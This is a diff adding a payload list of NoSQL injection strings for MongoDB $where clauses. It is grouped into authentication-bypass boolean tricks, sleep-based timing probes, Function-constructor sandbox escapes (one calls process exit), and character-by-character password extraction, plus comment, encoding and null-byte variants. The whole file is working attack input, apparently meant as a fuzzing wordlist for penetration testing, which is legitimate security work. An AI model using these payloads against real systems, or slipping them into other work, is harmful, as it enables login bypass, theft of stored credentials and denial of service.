@@ -1,0 +1,78 @@
+# NoSQL Injection - JavaScript Injection Payloads ($where clause)
+# Used for injecting JavaScript into MongoDB $where queries
+# Can achieve RCE in older MongoDB versions
+
+# Basic boolean true
+' || '1'=='1
+' || 1==1 || '
+" || "1"=="1
+" || 1==1 || "
+1 || 1==1
+0 || 1==1
+' || true || '
+" || true || "
+
+# Return true
+'; return true; '
+"; return true; "
+'; return true; //
+"; return true; //
+1; return true;
+0; return true
+
+# Object comparison
+this.a != 'invalid'
+this.password.length > 0
+this.username == 'admin'
+this.constructor
+
+# Sleep-based time detection (older MongoDB)
+'; sleep(5000); '
+"; sleep(5000); "
+1; sleep(5000)
+'; sleep(5000); var a='
+"; sleep(5000); var a="
+0; sleep(5000); var x=1
+
+# Function constructor (sandbox escape attempts)
+'; return this.constructor.constructor('return this')(); '
+'; this.constructor.constructor("return process")().exit(); '
+
+# Object property access
+'; return this.password; '
+'; return this; '
+'; return this.toJSON(); '
+'; return JSON.stringify(this); '
+'; return Object.keys(this); '
+
+# Data extraction via response difference
+'; return this.password.match(/^a/); '
+'; return this.password.length > 5; '
+'; return this.password.charAt(0) == 'a'; '
+
+# Bypass with comments
+1'--
+1'/*
+1'//
+1'; //
+1"; //
+
+# Alternative quotes
+' || `1`==`1
+\' || \'1\'==\'1
+
+# Hex encoding
+' || '\x31'=='\x31
+" || "\x31"=="\x31
+
+# Unicode
+' || '\u0031'=='\u0031
+" || "\u0031"=="\u0031
+
+# Null injection
+'; return 1; \x00
+'; return true; \x00
+
+# Array/Object injection
+'; [].map.call(this, function(x){return x}); '
+'; return this.__proto__; '
